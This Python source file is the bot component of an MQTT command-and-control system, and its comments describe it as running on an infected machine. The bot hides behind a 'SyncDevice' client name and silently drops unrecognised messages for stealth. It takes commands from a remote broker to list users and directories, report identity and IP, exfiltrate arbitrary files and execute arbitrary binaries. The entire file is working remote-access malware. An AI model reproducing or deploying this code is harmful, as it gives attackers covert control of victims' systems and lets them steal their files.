# Bot component of a Command & Control (C&C) system using MQTT
# This bot receives commands from a controller and executes them on the infected system

from paho.mqtt import client as mqtt
from common import *
import subprocess
import random
import socket

# Enable debug logging
DEBUG = False

# Generate a random bot ID disguised as a "SyncDevice" to appear legitimate
client_id = f"SyncDevice{random.randint(1, 9999)}"

def on_connect(client, userdata, flags, reason_code, properties):
    """
    Callback triggered when bot connects to MQTT broker.
    Subscribes to the C&C topic to receive commands from the controller.
    """
    # reason_code - connection result code. 0 - success, otherwise failure.
    if reason_code == 0:
        # Successfully connected - subscribe to receive commands
        client.subscribe(MQTT_TOPIC)
    else:
        print(f"Failed to connect to MQTT broker, connection return code {reason_code}.")
        client.disconnect()
        exit(1)

def on_message(client, userdata, msg):
    """
    Callback triggered when bot receives a message on the subscribed topic.
    Parses incoming commands from the controller and executes them.
    Ignores messages from unknown/unrecognized devices.
    """
    try:
        # Decode and parse the incoming message
        payload = msg.payload.decode()
        request_msg = RequestMessage.from_json(payload)

        try:
            # Extract controller command from the request
            data = ControllerMessage.from_request(request_msg)
            log(f"Deserialized payload: {data}")
            execute_action(client, data)
        except Exception:
            # Message doesn't match expected controller format
            raise UnknownDeviceError()
    
    except UnicodeDecodeError:
        pass  # Ignore messages from unknown devices
    except UnknownDeviceError:
        pass  # Ignore messages from unknown devices - maintains stealth
    except Exception as ex:
        log(f"Error processing message {ex.__class__.__name__}: {ex}")


def execute_action(client, data: ControllerMessage):
    """
    Executes commands received from the controller and sends back results.
    Supports various system reconnaissance and file operations.
    """
    response = RequestMessage()

    try:
        # Set bot ID in response to identify this bot to the controller
        response.set_device_id(client_id)
        output = None

        # Command: Report this bot's IP address to controller
        if data.user_action == CMD_LIST_BOTS:
            # Get hostname and resolve to IP address
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            output = ip

        # Command: List currently logged in users on the system
        elif data.user_action == CMD_LIST_USERS:
            # Execute 'w' command to list logged in users
            result = subprocess.run(['w'], capture_output=True, text=True, timeout=5000)
            output = result.stdout if result.returncode == 0 else f"Err {result.stderr}"
        
        # Command: List directory contents for reconnaissance
        elif data.user_action == CMD_LIST_DIR:
            if not data.path:
                raise Exception("Missing path")
            
            # Execute 'ls' to list directory contents
            result = subprocess.run(['ls', data.path], capture_output=True, text=True, timeout=5000)
            output = result.stdout if result.returncode == 0 else f"Err {result.stderr}"
            
        # Command: Get user ID and group information
        elif data.user_action == CMD_GET_USER_ID:
            # Execute 'id' command to get user id and permissions
            result = subprocess.run(['id'], capture_output=True, text=True, timeout=5000)
            output = result.stdout if result.returncode == 0 else f"Err {result.stderr}"
            
        # Command: Exfiltrate file contents to controller
        elif data.user_action == CMD_DOWNLOAD_FILE:
            if not data.path:
                raise Exception("Missing path")
           
            # Read file contents and send to controller
            with open(data.path, 'r') as file:
                output = file.read()
            
        # Command: Execute arbitrary binary on infected system
        elif data.user_action == CMD_EXECUTE_BINARY:
            if not data.path:
                raise Exception("Missing path")
        
            # Run the specified binary and capture output
            result = subprocess.run([data.path], capture_output=True, text=True, timeout=5000)
            output = result.stdout if result.returncode == 0 else f"Err {result.stderr}"

        # Send command results back to controller (encrypted/obfuscated)
        if output is not None:
            response.set_message(output)

    except FileNotFoundError:
        response.set_message(f"{data.path} not found")
    except subprocess.TimeoutExpired:
        response.set_message("Timeout")
    except Exception as ex:
        response.set_message(str(ex))
        
    # Publish response back to MQTT topic for controller to receive
    client.publish(MQTT_TOPIC, response.to_json())

def log(message):
    """Print debug messages if DEBUG mode is enabled."""
    if DEBUG:
        print(message)


def main():
    """
    Main bot entry point.
    Connects to MQTT broker and listens for commands indefinitely.
    """
    # Create MQTT client with callback API v2
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)

    client.on_connect = on_connect
    client.on_message = on_message

    client.connect(MQTT_BROKER, MQTT_PORT)

    try:
        client.loop_forever()
    except KeyboardInterrupt:
        client.disconnect()
    except Exception as ex:
        print(f"An error occurred: {ex}")
        client.disconnect()


if __name__ == "__main__":
    main()